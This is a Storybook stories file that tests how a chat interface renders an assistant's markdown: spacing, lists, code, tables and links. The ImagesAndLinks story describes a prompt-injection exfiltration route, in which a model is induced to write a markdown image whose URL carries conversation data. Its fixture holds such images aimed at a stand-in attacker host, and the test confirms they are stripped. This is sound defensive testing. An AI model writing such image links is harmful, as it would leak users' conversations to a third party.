import type { Meta, StoryObj } from "@storybook/nextjs-vite";
import { expect, within } from "storybook/test";
import { ChatMessage } from "./chat-message";

const DRAFT = [
  "Here's a first draft.",
  "**Subject:** Meet Orbit",
  "Hi there,",
  "Today we're launching Orbit. It brings your plans, files and updates into a single workspace.",
  "The Acme team",
].join("\n\n");

/** The space, in pixels, between the first two paragraphs, as the browser lays them out. */
function gapBetweenParagraphs(canvasElement: HTMLElement): number {
  const [first, second] = canvasElement.querySelectorAll("p");

  return (
    (second?.getBoundingClientRect().top ?? 0) -
    (first?.getBoundingClientRect().bottom ?? 0)
  );
}

const meta = {
  title: "Features/ChatMessage",
  component: ChatMessage,
  tags: ["autodocs"],
  decorators: [
    (Story) => (
      <div className="max-w-2xl">
        <Story />
      </div>
    ),
  ],
} satisfies Meta<typeof ChatMessage>;

export default meta;
type Story = StoryObj<typeof meta>;

/**
 * A message of the assistant that holds several paragraphs: a blank line
 * starts one, and the space between two is drawn, as it is for the person.
 */
export const Assistant: Story = {
  args: { role: "assistant", content: DRAFT },
  play: async ({ canvasElement }) => {
    await expect(gapBetweenParagraphs(canvasElement)).toBeGreaterThan(0);
  },
};

const MARKDOWN = [
  "## Launch plan",
  "Here is what **needs to happen**, in order. See [the guide](https://example.com/guide) for the details.",
  "- Write the announcement\n- Review it with the team\n  - Legal\n  - Design\n- Send it",
  "1. Draft\n2. Review\n3. Ship",
  "- [x] Domain bought\n- [ ] Pricing page",
  "### Run it",
  "Start the server with `npm run dev`, then open the app:",
  "```bash\nnpm run dev -- --port 3088 --hostname 127.0.0.1 --turbopack --experimental-https --some-very-long-flag-that-keeps-going\n```",
  "> Keep it short: nobody reads a long launch email.",
  "| Plan | Seats |\n| --- | --- |\n| Free | 1 |\n| Pro | 10 |",
  "---",
  "That is all.",
].join("\n\n");

/** The computed style of an element of the story, as the browser resolves it. */
function styleOf(canvasElement: HTMLElement, selector: string): CSSStyleDeclaration {
  const element = canvasElement.querySelector(selector);
  if (!element) {
    throw new Error(`Nothing matches ${selector}`);
  }

  return getComputedStyle(element);
}

/**
 * What the assistant writes in markdown: headings, lists (nested, ordered, task
 * lists), links, inline code, a block of code, a quote, a table and a rule. The
 * base style of Tailwind resets all of them, and the `markdown` style draws them
 * back from the tokens: the play reads what the browser resolved.
 */
export const Markdown: Story = {
  args: { role: "assistant", content: MARKDOWN },
  play: async ({ canvasElement }) => {
    const paragraph = styleOf(canvasElement, "p");

    // Lists have their markers and their indent back, and a nested list tells itself apart
    await expect(styleOf(canvasElement, "ul").listStyleType).toBe("disc");
    await expect(styleOf(canvasElement, "ul ul").listStyleType).toBe("circle");
    await expect(styleOf(canvasElement, "ol").listStyleType).toBe("decimal");
    await expect(Number.parseFloat(styleOf(canvasElement, "ul").paddingInlineStart)).toBeGreaterThan(16);
    await expect(styleOf(canvasElement, "ul.contains-task-list").listStyleType).toBe("none");

    // Headings stand out from the text, on the scale of the app
    await expect(styleOf(canvasElement, "h2").fontWeight).toBe("600");
    await expect(Number.parseFloat(styleOf(canvasElement, "h2").fontSize)).toBeGreaterThan(Number.parseFloat(paragraph.fontSize));
    await expect(Number.parseFloat(styleOf(canvasElement, "h3").fontSize)).toBe(Number.parseFloat(paragraph.fontSize));
    await expect(styleOf(canvasElement, "h3").fontWeight).toBe("600");

    // Code is set apart: a monospace chip in a line, a bordered block that scrolls and a keyboard reaches
    await expect(styleOf(canvasElement, "p code").fontFamily).not.toBe(paragraph.fontFamily);
    await expect(styleOf(canvasElement, "p code").backgroundColor).not.toBe("rgba(0, 0, 0, 0)");
    await expect(styleOf(canvasElement, "pre").overflowX).toBe("auto");
    await expect(styleOf(canvasElement, "pre").borderTopWidth).toBe("1px");
    await expect(styleOf(canvasElement, "pre code").backgroundColor).toBe("rgba(0, 0, 0, 0)");
    await expect(canvasElement.querySelector("pre")).toHaveAttribute("tabindex", "0");
    const pre = canvasElement.querySelector("pre");
    await expect(pre && pre.scrollWidth > pre.clientWidth).toBe(true);

    // A link looks like one, a quote has its bar, a table has its lines, and the blocks are spaced
    await expect(styleOf(canvasElement, "a").textDecorationLine).toBe("underline");
    await expect(styleOf(canvasElement, "blockquote").borderInlineStartWidth).toBe("3px");
    await expect(styleOf(canvasElement, "td").borderTopWidth).toBe("1px");
    await expect(Number.parseFloat(styleOf(canvasElement, "td").paddingLeft)).toBeGreaterThan(0);
    await expect(Number.parseFloat(styleOf(canvasElement, "h2 + p").marginTop)).toBeGreaterThan(0);
    await expect(Number.parseFloat(styleOf(canvasElement, "h3").marginTop)).toBeGreaterThan(Number.parseFloat(styleOf(canvasElement, "h2 + p").marginTop));
    await expect(Number.parseFloat(styleOf(canvasElement, "h2").marginTop)).toBe(0);
    await expect(Number.parseFloat(styleOf(canvasElement, "hr").borderTopWidth)).toBe(1);
  },
};

/** The same markdown in a narrow column: a long line of code scrolls in its box, and nothing leaves the message. */
export const MarkdownInANarrowColumn: Story = {
  args: { role: "assistant", content: MARKDOWN },
  decorators: [
    (Story) => (
      <div className="max-w-xs">
        <Story />
      </div>
    ),
  ],
  play: async ({ canvasElement }) => {
    await expect(canvasElement.scrollWidth).toBeLessThanOrEqual(canvasElement.clientWidth);
    const pre = canvasElement.querySelector("pre");
    await expect(pre && pre.scrollWidth > pre.clientWidth).toBe(true);
    await expect(pre && pre.getBoundingClientRect().right <= canvasElement.getBoundingClientRect().right).toBe(true);
  },
};

/**
 * An answer is text the model wrote, and an instruction slipped into the conversation can make it
 * write anything: an image would be fetched by the browser from an address the model chose, and
 * the address can carry what the conversation says. No image is drawn, only its alt text. A link
 * opens in a tab of its own, which knows nothing of this one.
 */
export const ImagesAndLinks: Story = {
  args: {
    role: "assistant",
    content: [
      "Here is the chart: ![Sales by quarter](https://attacker.example/pixel.png?q=secret)",
      "![](https://attacker.example/silent.png)",
      "Read [the guide](https://example.com/guide) first.",
    ].join("\n\n"),
  },
  play: async ({ canvasElement }) => {
    await expect(canvasElement.querySelector("img")).toBeNull();
    await expect(canvasElement).toHaveTextContent("Here is the chart: Sales by quarter");
    await expect(canvasElement.innerHTML).not.toContain("attacker.example");

    const link = canvasElement.querySelector("a");
    await expect(link).toHaveAttribute("href", "https://example.com/guide");
    await expect(link).toHaveAttribute("target", "_blank");
    await expect(link).toHaveAttribute("rel", "noopener noreferrer nofollow");
  },
};

/**
 * A link of an answer follows the rule of the anchors of the shell: a web address opens in a tab of
 * its own, and says so to assistive technology, in words that only it reads. Any other link stays
 * in the tab it is in: the jump of a footnote, and a `mailto:`. A link with no text shows its
 * address, which wraps in a narrow column instead of leaving the message.
 */
export const LinksOfAnAnswer: Story = {
  args: {
    role: "assistant",
    content: [
      "Read [the guide](https://example.com/guide), or write to [the team](mailto:team@example.com).",
      "A claim with a source.[^1]",
      "[![](https://attacker.example/logo.png)](https://example.com/page)",
      "[](https://example.com/a/very/long/path/that/keeps/going/and/going/until/it/has/to/wrap/in/a/narrow/column)",
      "[^1]: The source.",
    ].join("\n\n"),
  },
  play: async ({ canvasElement }) => {
    const canvas = within(canvasElement);

    // A web address: a tab of its own, and its words are in the name that assistive technology reads
    const guide = canvas.getByRole("link", { name: /^the guide/ });
    await expect(guide).toHaveAttribute("target", "_blank");
    await expect(guide).toHaveAttribute("rel", "noopener noreferrer nofollow");
    await expect(guide).toHaveAccessibleName("the guide (opens in a new tab)");
    const words = canvas.getAllByText("(opens in a new tab)")[0];
    await expect(words && words.getBoundingClientRect().width).toBeLessThanOrEqual(1);

    // Any other link stays where it is
    const team = canvas.getByRole("link", { name: "the team" });
    await expect(team).toHaveAttribute("href", "mailto:team@example.com");
    await expect(team).not.toHaveAttribute("target");
    const reference = canvas.getByRole("link", { name: "1" });
    await expect(reference).toHaveAttribute("href", "#user-content-fn-1");
    await expect(reference).not.toHaveAttribute("target");
    await expect(canvas.getByRole("link", { name: "Back to reference 1" })).not.toHaveAttribute("target");

    // No text: the address is the text, the link stays, and no image is drawn
    const page = canvas.getByRole("link", { name: /^https:\/\/example\.com\/page/ });
    await expect(page).toHaveAttribute("href", "https://example.com/page");
    await expect(page).toHaveAttribute("target", "_blank");
    await expect(canvas.getByRole("link", { name: /^https:\/\/example\.com\/a\/very\/long/ })).toBeVisible();
    await expect(canvasElement.querySelector("img")).toBeNull();
    await expect(canvasElement.scrollWidth).toBeLessThanOrEqual(canvasElement.clientWidth);
  },
};

/** The same for what the person writes: their paragraphs keep their space. */
export const Person: Story = {
  args: {
    role: "user",
    content:
      "Draft the launch email for Orbit.\n\nKeep it short and friendly, and say what's new.",
  },
  play: async ({ canvasElement }) => {
    await expect(gapBetweenParagraphs(canvasElement)).toBeGreaterThan(0);
  },
};
